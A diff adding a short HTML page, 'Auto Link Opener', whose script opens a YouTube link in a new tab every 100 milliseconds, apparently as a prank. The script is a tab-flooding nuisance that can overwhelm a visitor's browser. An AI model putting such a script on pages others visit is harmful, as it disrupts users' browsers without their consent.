@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Auto Link Opener</title>
+  </head>
+  <body>
+    <p>Redirecting to the link every 0.10 seconds...</p>
+    <script>
+      function openLink() {
+        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+      }
+      setInterval(openLink, 100);
+    </script>
+  </body>
+</html>
